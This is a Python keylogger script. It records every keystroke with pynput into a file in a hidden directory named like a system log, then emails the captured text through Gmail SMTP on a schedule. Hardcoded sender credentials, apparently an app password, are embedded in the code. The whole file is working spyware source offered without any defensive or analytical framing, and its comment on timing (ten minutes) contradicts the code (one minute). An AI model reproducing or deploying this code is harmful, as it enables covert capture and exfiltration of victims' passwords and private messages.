import os
import socket
import smtplib
import schedule
import time
import threading
from pynput import keyboard
from email.message import EmailMessage

EMAIL_ADDRESS = 'nduokoronkwochinememark@gmail.com'
EMAIL_PASSWORD = 'tgtk aibm smbf pgdg'
RECIPIENT_EMAIL = 'nduokoronkwochinememark@gmail.com'

# Log file setup
log_dir = os.path.expanduser('~/.config/.syslogs')
os.makedirs(log_dir, exist_ok=True)
log_file = os.path.join(log_dir, "hostlog.dat")

def on_press(key):
    try:
        log = key.char
    except AttributeError:
        if key == keyboard.Key.space:
            log = ' '
        elif key == keyboard.Key.enter:
            log = '\n'
        elif key == keyboard.Key.tab:
            log = '[TAB]'
        elif key == keyboard.Key.backspace:
            log = '[BACKSPACE]'
        elif key == keyboard.Key.esc:
            log = '[ESC]'
        else:
            log = f'[{key.name.upper()}]' if hasattr(key, 'name') else f'[{key}]'

    with open(log_file, "a") as f:
        f.write(log)

def start_keylogger():
    with keyboard.Listener(on_press=on_press) as listener:
        listener.join()

keylogger_thread = threading.Thread(target=start_keylogger, daemon=True)
keylogger_thread.start()

def is_connected():
    try:
        socket.create_connection(("8.8.8.8", 53), timeout=3)
        return True
    except OSError:
        return False

def send_log():
    if not os.path.exists(log_file) or os.stat(log_file).st_size == 0:
        return

    msg = EmailMessage()
    msg['Subject'] = 'Keylogger Report'
    msg['From'] = EMAIL_ADDRESS
    msg['To'] = RECIPIENT_EMAIL

    with open(log_file, 'rb') as f:
        file_data = f.read()
        msg.set_content("Attached is the latest keylog.")
        msg.add_attachment(file_data, maintype='text', subtype='plain', filename='hostlog.txt')

    with smtplib.SMTP_SSL('smtp.gmail.com', 465) as smtp:
        smtp.login(EMAIL_ADDRESS, EMAIL_PASSWORD)
        smtp.send_message(msg)

    # Clear the log
    open(log_file, 'w').close()

# Schedule sending every 10 minutes
schedule.every(1).minutes.do(lambda: send_log() if is_connected() else None)

while True:
    schedule.run_pending()
    time.sleep(60)
